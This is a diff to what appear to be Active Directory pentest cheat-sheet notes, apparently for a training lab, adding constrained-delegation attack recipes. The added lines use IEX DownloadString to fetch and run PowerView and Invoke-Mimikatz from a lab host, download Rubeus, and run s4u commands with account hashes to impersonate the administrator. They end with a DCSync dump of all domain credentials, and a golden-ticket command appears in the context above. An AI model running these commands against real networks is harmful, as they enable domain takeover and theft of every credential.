@@ -1579,6 +1579,33 @@ enter-pssession -computername TECH-DC01.TECH.LOCAL
 ```
 kerberos::golden /User:vegeta /domain:tech.local /sid:S-1-5-21-4215187987-3124207031-433979976 /krbtgt:28ec87e3414d019c944786bf447fd666 id:500 /groups:512 /startoffset:0 /ending:600 /renewmax:10080 /ptt
 ```
+##### CONSTRAINED DELEGATION - USUARIO PAPUM
+websvc:cc098f204c5887eaa8253e7c2749156f
+```
+IEX(New-Object System.Net.WebClient).DownloadString("http://172.16.99.209/oscp/PowerView_dev.ps1")
+$FormatEnumerationLimit=-1
+Get-DomainUser -TrustedToAuth | select samaccountname, msds-allowedtodelegateto, useraccountcontrol  | fl | Out-String -Width 4096
+curl http://172.16.99.209/oscp/Rubeus.exe -Outfile Rubeus.exe
+.\rubeus.exe s4u /user:websvc /rc4:cc098f204c5887eaa8253e7c2749156f /impersonateuser:"administrator" /msdsspn:"CIFS/dcorp-mssql" /altservice:host,http,wsman,rpcss,ldap,cifs /ptt
+enter-pssession -computername  dcorp-mssql
+```
+##### CONSTRAINED DELEGATION - COMPUTER PAPUM
+DCORP-ADMINSRV$:5e77978a734e3a7f3895fb0fdbda3b96
+```
+IEX(New-Object System.Net.WebClient).DownloadString("http://172.16.99.209/oscp/crtp/Invoke-Mimikatz2.ps1")
+curl http://172.16.99.209/oscp/crtp/Invoke-Mimikatz2.ps1 -outfile Invoke-Mimikatz2.ps1
+
+curl http://172.16.99.209/oscp/crtp/ADModule-master.zip -Outfile ADModule-master.zip
+Expand-Archive .\ADModule-master.zip
+import-module .\Microsoft.ActiveDirectory.Management.dll
+cd .\ActiveDirectory\
+import-module .\ActiveDirectory.psd1
+Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties * | select samaccountname, msDS-AllowedToDelegateTo | Out-String -Width 4096
+.\rubeus.exe s4u /user:DCORP-ADMINSRV$ /rc4:5e77978a734e3a7f3895fb0fdbda3b96 /impersonateuser:"administrator" /msdsspn:"TIME/dcorp-DC" /altservice:cifs,ldap /ptt
+.\rubeus.exe s4u /user:DCORP-ADMINSRV$ /rc4:5e77978a734e3a7f3895fb0fdbda3b96 /impersonateuser:"administrator" /msdsspn:"TIME/dcorp-dc.dollarcorp.moneycorp.LOCAL" /altservice:cifs,ldap /ptt
+lsadump::dcsync /domain:dollarcorp.moneycorp.local /all /csv
+```
+
 
 ## RESOURCE-BASED CONSTRAINED DELEGATION
 This is similar to the basic Constrained Delegation but instead of giving permissions to an object to impersonate any user against a service. Resource-based Constrain Delegation sets in the object who is able to impersonate any user against it.
